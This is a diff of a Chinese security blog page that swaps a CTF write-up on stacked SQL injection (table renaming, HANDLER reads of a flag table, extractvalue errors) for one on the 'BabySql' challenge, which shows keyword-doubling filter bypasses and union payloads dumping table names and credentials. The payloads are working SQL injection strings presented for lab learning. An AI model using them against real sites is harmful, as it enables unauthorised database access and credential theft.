@@ -15,23 +15,26 @@
 <link rel="stylesheet" href="/css/tags.css" media="all">
 
 
-<meta name="description" content="奇怪的堆栈注入知识又增加了">
+<meta name="description" content="主要对sql语句进行了fuzz，挺无语的。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="堆栈注入_CTF">
-<meta property="og:url" content="https://www.tu3k.cn/2021/03/27/duizhan-sql/index.html">
+<meta property="og:title" content="极客大挑战_BabySql">
+<meta property="og:url" content="https://www.tu3k.cn/2021/04/16/babysql/index.html">
 <meta property="og:site_name">
-<meta property="og:description" content="奇怪的堆栈注入知识又增加了">
+<meta property="og:description" content="主要对sql语句进行了fuzz，挺无语的。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://www.tu3k.cn/images/php_web_ctf/32.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/php_web_ctf/33.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/php_web_ctf/30.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/php_web_ctf/31.png">
-<meta property="og:image" content="https://www.tu3k.cn/images/php_web_ctf/34.png">
-<meta property="article:published_time" content="2021-03-27T06:29:13.000Z">
-<meta property="article:modified_time" content="2021-03-27T06:54:16.395Z">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/110.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/111.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/112.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/113.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/114.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/115.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/116.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/117.png">
+<meta property="article:published_time" content="2021-04-16T06:56:01.000Z">
+<meta property="article:modified_time" content="2021-04-16T07:20:19.183Z">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://www.tu3k.cn/images/php_web_ctf/32.png">
+<meta name="twitter:image" content="http://www.tu3k.cn/images/php_web_ctf/110.png">
 
 
     <link rel="icon" href="/images/favicon.ico">
@@ -65,7 +68,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>堆栈注入_CTF | Tu3k's Blog</title>
+<title>极客大挑战_BabySql | Tu3k's Blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -274,11 +277,11 @@
     </div>
     <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
-      <div class="body-wrap"><article id="post-duizhan-sql" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-babysql" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/03/27/duizhan-sql/" class="article-date">
-      <time datetime="2021-03-27T06:29:13.000Z" itemprop="datePublished">2021-03-27</time>
+      <a href="/2021/04/16/babysql/" class="article-date">
+      <time datetime="2021-04-16T06:56:01.000Z" itemprop="datePublished">2021-04-16</time>
 </a>
 
 
@@ -293,7 +296,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      堆栈注入_CTF
+      极客大挑战_BabySql
     </h1>
   
 
@@ -314,15 +317,17 @@
 <div class="article-entry" itemprop="articleBody">
     
         
-        <p>奇怪的堆栈注入知识又增加了</p>
+        <p>主要对sql语句进行了fuzz，挺无语的。</p>
 <a id="more"></a>
-<h3 id="GYCTF"><a href="#GYCTF" class="headerlink" title="GYCTF"></a>GYCTF</h3><p>堆栈注入基本语句，首先如果要闭合语句先测试闭合语句并闭合好<br><code>1&#39;;show databases#</code><br><img src="https://www.tu3k.cn/images/php_web_ctf/32.png" alt="duizhan_sql" title="duizhan_sql"><br><img src="https://www.tu3k.cn/images/php_web_ctf/33.png" alt="duizhan_sql" title="duizhan_sql"><br>在GYCTF中，将alter也加入黑名单了<br>这比强网杯中的堆栈注入过滤的还多，强网杯中通过修改当前输入框id字段对应的表名和字段名来获取flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当在输入框输入1查询时，去words表中的id字段查，所以我们可以进行更改，将words表改成words1，flag表改成words表，通过修改字段名为id，来达到查询flag的目的</span><br><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1918xxxxxx&#96; to &#96;words&#96;;alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100)#</span><br><span class="line">此时输入1就是去flag查询数据了，写个条件为真的语句直接出flag</span><br><span class="line">1&#39; or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
-<p>尝试报错注入<br><code>1&#39; and extractvalue(1,concat(&#39;~&#39;,user()))#</code><br><img src="https://www.tu3k.cn/images/php_web_ctf/30.png" alt="duizhan_sql" title="duizhan_sql"><br><code>1&#39;;show tables;show columns from FlagHere#</code><br><img src="https://www.tu3k.cn/images/php_web_ctf/31.png" alt="duizhan_sql" title="duizhan_sql"><br>flag存放在FlagHere表中的flag字段内，报错注入查数据时还是被拦截了，这时候主角登场</p>
-<h3 id="HANDLER语法"><a href="#HANDLER语法" class="headerlink" title="HANDLER语法"></a>HANDLER语法</h3><p>HANDLER table OPEN;         打开一个表，以便后面能直接读取表内的东西<br>HANDLER table READ FIRST;    读取表内第一条数据<br>HANDLER table CLOSE;        关闭资源</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;handler FlagHere OPEN;handler FlagHere READ FIRST;handler FlagHere CLOSE#</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.tu3k.cn/images/php_web_ctf/34.png" alt="duizhan_sql" title="duizhan_sql"></p>
-<p>GET.</p>
+<h3 id="《丁香花》"><a href="#《丁香花》" class="headerlink" title="《丁香花》"></a>《丁香花》</h3><p>开局一个登录框，提示是sql注入<br><img src="http://www.tu3k.cn/images/php_web_ctf/110.png" alt="babysql" title="babysql"><br>经测试，闭合语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; #</span><br><span class="line">123456</span><br><span class="line">登录成功</span><br></pre></td></tr></table></figure>
+<p>在闭合语句内进行sql语句fuzz<br>fuzz的语句在报错中的 ，都是没有被过滤的<br><img src="http://www.tu3k.cn/images/php_web_ctf/111.png" alt="babysql" title="babysql"><br>相反如果语句返回包是登录成功，那么这个语句就是被过滤的<br><img src="http://www.tu3k.cn/images/php_web_ctf/112.png" alt="babysql" title="babysql"><br>经fuzz，and、or、select、union、from、where 是被过滤的，这里绕过也很简单，直接双写绕过<br><img src="http://www.tu3k.cn/images/php_web_ctf/113.png" alt="babysql" title="babysql"><br><img src="http://www.tu3k.cn/images/php_web_ctf/114.png" alt="babysql" title="babysql"><br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin%27%20aandnd%201&#x3D;1%23</span><br><span class="line">admin%27%20oorrder%20bbyy%204%23</span><br><span class="line">admin&#39; anandd 1&#x3D;2 ununionion seleselectct 1,2,3 #</span><br><span class="line">admin&#39; anandd 1&#x3D;2 ununionion seleselectct 1,group_concat(table_name),3 frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database() #</span><br></pre></td></tr></table></figure>
+<p><img src="http://www.tu3k.cn/images/php_web_ctf/115.png" alt="babysql" title="babysql"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; anandd 1&#x3D;2 uniunionon seleselectct 1,group_concat(column_name),3 frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;0x62346273716c #</span><br></pre></td></tr></table></figure>
+<p><img src="http://www.tu3k.cn/images/php_web_ctf/116.png" alt="babysql" title="babysql"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; anandd 1&#x3D;2 uniunionon seleselectct 1,group_concat(id,username,password),3 frfromom b4bsql #</span><br></pre></td></tr></table></figure>
+<p><img src="http://www.tu3k.cn/images/php_web_ctf/117.png" alt="babysql" title="babysql"><br>flag{39bc3c04-8d16-4eff-b1a7-8b6aca3334f6}</p>
 
     
 </div>
@@ -331,13 +336,13 @@
   
     
     <div class="copyright">
-        <p><span>Title:</span><a href="/2021/03/27/duizhan-sql/">堆栈注入_CTF</a></p>
+        <p><span>Title:</span><a href="/2021/04/16/babysql/">极客大挑战_BabySql</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
-        <p><span>Created:</span>2021-03-27, 14:29:13</p>
-        <p><span>Updated:</span>2021-03-27, 14:54:16</p>
+        <p><span>Created:</span>2021-04-16, 14:56:01</p>
+        <p><span>Updated:</span>2021-04-16, 15:20:19</p>
         <p>
-            <span>Full URL:</span><a class="post-url" href="/2021/03/27/duizhan-sql/" title="堆栈注入_CTF">https://www.tu3k.cn/2021/03/27/duizhan-sql/</a>
-            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/03/27/duizhan-sql/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <span>Full URL:</span><a class="post-url" href="/2021/04/16/babysql/" title="极客大挑战_BabySql">https://www.tu3k.cn/2021/04/16/babysql/</a>
+            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/04/16/babysql/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -349,16 +354,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2021/03/27/filemanage-ctf/">
-                    文件上传二次注入_CTF
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2021/03/26/php-nizhuansiwei-ctf/">
-                    PHP逆转思维_CTF
+                <a href="/2021/04/16/calc-ctf/">
+                    CTF_Easy Calc
                 </a>
             </div>
         
@@ -370,7 +369,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#GYCTF"><span class="toc-number">1.</span> <span class="toc-text">GYCTF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HANDLER%E8%AF%AD%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">HANDLER语法</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%8A%E4%B8%81%E9%A6%99%E8%8A%B1%E3%80%8B"><span class="toc-number">1.</span> <span class="toc-text">《丁香花》</span></a></li></ol>
         
     </div>
     <style>
@@ -406,7 +405,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"堆栈注入_CTF　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"极客大挑战_BabySql　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -426,15 +425,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2021/03/27/filemanage-ctf/" title="Pre: 文件上传二次注入_CTF">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="Back to Homepage"><i class="fa fa-home"></i></a>
         
 
         <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2021/03/26/php-nizhuansiwei-ctf/" title="Next: PHP逆转思维_CTF">
+            <a href="/2021/04/16/calc-ctf/" title="Next: CTF_Easy Calc">
                 <i class="fa fa-angle-right"></i>
             </a>
         
